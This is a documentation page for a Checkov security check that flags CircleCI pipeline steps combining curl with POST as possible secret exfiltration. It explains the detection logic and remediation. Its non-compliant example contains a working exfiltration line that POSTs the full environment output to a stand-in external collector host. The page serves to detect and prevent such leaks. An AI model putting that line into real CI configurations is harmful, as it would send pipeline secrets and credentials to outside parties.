# CKV_CIRCLECIPIPELINES_7: Suspicious use of curl in run task

## Severity
**HIGH** (score: 7.8/10)

A `curl ... POST` pattern in a CI run step is a strong indicator of exfiltration of CI secrets/environment variables or build artifacts to an external endpoint controlled by an attacker.

## Summary
This check flags CircleCI `run` steps that use `curl` together with `POST` on the same line, a pattern consistent with exfiltrating data (such as secrets or environment variables) to an external endpoint.

## Applicability
Applies to CircleCI Pipeline configuration files (`.circleci/config.yml`), specifically every step under `jobs.*.steps[]` that is a `run` step, in both the string shorthand and the `run: {command: ...}` map form.

## Why it matters
CI jobs commonly have access to secrets (API keys, cloud credentials, signing keys) injected as environment variables or CircleCI contexts. A `curl ... -X POST ...` (or similar POST invocation) inside a pipeline step is a common exfiltration technique: an attacker who can influence pipeline config (via a malicious PR, compromised dependency, or supply-chain-injected orb) can send job secrets to an external server they control simply by curling them out as POST data. While `curl -X POST` also has many legitimate uses (webhooks, deployment triggers, notifications), its presence warrants review because it is one of the simplest and most common exfiltration primitives available in a shell environment with outbound network access.

## How Checkov evaluates this
The check (`SuspectCurlInScript`) inspects each `run` step's command text (from `run.command` in map form, or the string directly). If the substring `"curl"` appears anywhere in the command, it splits the command into lines and, for each line, checks whether **both** `"curl"` and `"POST"` appear as substrings on that same line. If any single line contains both, the step is `FAILED`. If `curl` never appears, or `curl` and `POST` never co-occur on the same line, the step `PASSED`s. Note this is a simple substring match — it does not parse the actual curl flags, so it will match `POST` appearing anywhere on the line (e.g. in a comment or unrelated string), not only as `-X POST`.

## Non-compliant example
```yaml
version: 2.1

jobs:
  build:
    docker:
      - image: cimg/base:current
    steps:
      - checkout
      - run:
          name: "Report build environment"
          command: |
            curl -X POST -d "$(env)" https://collector.example-external.net/ingest
```

## Remediated example
```yaml
version: 2.1

jobs:
  build:
    docker:
      - image: cimg/base:current
    steps:
      - checkout
      - run:
          name: "Report build status to approved endpoint"
          command: |
            curl -X POST \
              -H "Authorization: Bearer $INTERNAL_STATUS_TOKEN" \
              -d '{"status":"success"}' \
              https://ci-status.internal.example.com/webhook
```
The fix here is not to remove POST usage outright, but to ensure the destination is a known, approved internal/vendor endpoint and that no bulk environment or secret data (`$(env)`, `printenv`, full credential dumps) is being sent.

## Remediation steps
1. Review every flagged line to confirm the `curl ... POST` request is going to a trusted, expected destination (your own webhook, a known SaaS API, etc.) and is not leaking secrets or environment dumps.
2. Never POST the output of `env`, `printenv`, `set`, or files containing credentials/tokens to any endpoint, even an internal one, unless that is the explicit intended behavior (e.g., a secrets-rotation job) and it's tightly scoped.
3. If it's a false positive (e.g., posting non-sensitive build metadata to an internal status endpoint), document the destination and add a scoped Checkov skip comment with justification.
4. If the pattern was introduced by a third-party orb, pin/audit that orb version and review its changelog for what changed.
5. Add network egress controls on CI runners where feasible, so outbound requests are limited to an allow-list of known hosts.

## References
- Checkov check source: https://github.com/bridgecrewio/checkov/blob/main/checkov/circleci_pipelines/checks/SuspectCurlInScript.py
